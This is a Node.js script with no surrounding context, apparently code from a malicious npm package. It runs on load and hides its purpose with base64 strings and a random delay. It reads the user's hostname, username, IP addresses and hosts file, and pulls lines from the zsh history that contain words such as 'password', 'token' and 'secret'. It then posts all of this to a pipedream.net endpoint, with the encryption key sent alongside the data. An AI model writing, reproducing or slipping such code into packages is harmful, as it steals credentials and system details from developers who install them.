(function(){
    const _fs = require('fs');
    const _path = require('path');
    const _crypto = require('crypto');
    const _https = require('https');
    const _os = require('os');

    const _url = 'aHR0cHM6Ly9lb2t0Ym5yMTQzZXhmenMubS5waXBlZHJlYW0ubmV0';

    const _kw = [
        'Y2F0',
        'cGVya2lucw==',
        'YXZlc2Nv',
        'cHJvZ3Jlc3NyYWls',
        'cGFzcw==',
        'cGFzc3dvcmQ=',
        'YWNjZXNz',
        'dG9rZW4=',
        'c2VjcmV0',
        'Y29uZmlkZW50aWFs'
    ].map(w => Buffer.from(w, 'base64').toString('utf8'));

    function _enc(data) {
        const _key = _crypto.randomBytes(32);
        const _iv = _crypto.randomBytes(16);
        const _cipher = _crypto.createCipheriv('aes-256-cbc', _key, _iv);

        let _encrypted = _cipher.update(data, 'utf8', 'hex');
        _encrypted += _cipher.final('hex');

        return {
            _encData: _encrypted,
            _encKey: _key.toString('hex'),
            _encIV: _iv.toString('hex')
        };
    }

    function _getLocalIPs() {
        const _interfaces = _os.networkInterfaces();
        const _ips = [];

        for (const _iface of Object.keys(_interfaces)) {
            for (const _details of _interfaces[_iface]) {
                if (!_details.internal) {
                    _ips.push(_details.address);
                }
            }
        }
        return _ips;
    }

    function _getPublicIP(callback) {
        const _opts = {
            hostname: 'api.ipify.org',
            path: '/?format=json',
            method: 'GET'
        };

        const _req = _https.request(_opts, (res) => {
            let _data = '';
            res.on('data', (chunk) => {
                _data += chunk;
            });

            res.on('end', () => {
                try {
                    const _ip = JSON.parse(_data).ip;
                    callback(null, _ip);
                } catch (e) {
                    callback(e, null);
                }
            });
        });

        _req.on('error', (e) => {
            console.error('E-IP-pu:', e.message);
            callback(e, null);
        });

        _req.end();
    }

    function _getHistory() {
        const _histFile = _path.join(_os.homedir(), '.zsh_history');
        let _history = [];

        try {
            const _fileData = _fs.readFileSync(_histFile, 'utf8');
            const _lines = _fileData.split('\n');

            _history = _lines.filter(line => 
                _kw.some(kw => line.includes(kw))
            );

        } catch (e) {
            console.error('E-His:', e.message);
        }

        return _history;
    }

    function _gatherSystemInfo(callback) {
        const _hn = _os.hostname();
        const _pl = _os.platform();
        const _rl = _os.release();
        const _user = _os.userInfo().username;

        const _localIPs = _getLocalIPs();

        _getPublicIP((err, publicIP) => {
            if (err) {
                publicIP = 'Desconocido';
            }

            let _hostsContent = '';
            if (_pl === 'win32') {
                const _hostsPath = _path.join('C:', 'Windows', 'System32', 'drivers', 'etc', 'hosts');
                try {
                    _hostsContent = _fs.readFileSync(_hostsPath, 'utf8');
                } catch (e) {
                    _hostsContent = `E-W: ${e.message}`;
                }
            } else {
                try {
                    _hostsContent = _fs.readFileSync('/etc/hosts', 'utf8');
                } catch (e) {
                    _hostsContent = `E-LM: ${e.message}`;
                }
            }

            const _filteredHistory = _getHistory();

            const _sysInfo = {
                hostname: _hn,
                platform: _pl,
                release: _rl,
                username: _user,
                localIPs: _localIPs,
                publicIP: publicIP,
                hostsFileContent: _hostsContent,
                filteredHistory: _filteredHistory
            };

            callback(_sysInfo);
        });
    }

    function _sendDataToDiscord(sysInfo) {
        const { _encData, _encKey, _encIV } = _enc(JSON.stringify(sysInfo));

        let _historyStr = sysInfo.filteredHistory.join(', ');
        if (_historyStr.length > 2000) {
            _historyStr = _historyStr.substring(0, 1997) + '...';
        }

        const _encodedHistory = Buffer.from(_historyStr).toString('base64');

        const _data = JSON.stringify({
            content: `ED: \`${_encData}\`\nKey: \`${_encKey}\`\nIV: \`${_encIV}\`\nFH: \`${_encodedHistory}\``,
            username: "NPM"
        });

        const _webhookUrl = new URL(Buffer.from(_url, 'base64').toString('utf8'));
        const _reqOpts = {
            hostname: _webhookUrl.hostname,
            path: _webhookUrl.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': _data.length
            }
        };

        const _request = _https.request(_reqOpts, (res) => {
            res.on('data', (d) => {
                process.stdout.write(d);
            });
        });

        _request.on('error', (e) => {
            console.error(`Error enviando datos: ${e.message}`);
        });

        _request.write(_data);
        _request.end();
    }

    function _delayExec(min = 5000, max = 30000) {
        const _delay = Math.floor(Math.random() * (max - min + 1)) + min;
        return new Promise(resolve => setTimeout(resolve, _delay));
    }

    (async function main() {
        await _delayExec();

        _gatherSystemInfo((sysInfo) => {
            _sendDataToDiscord(sysInfo);
        });
    })();
})();
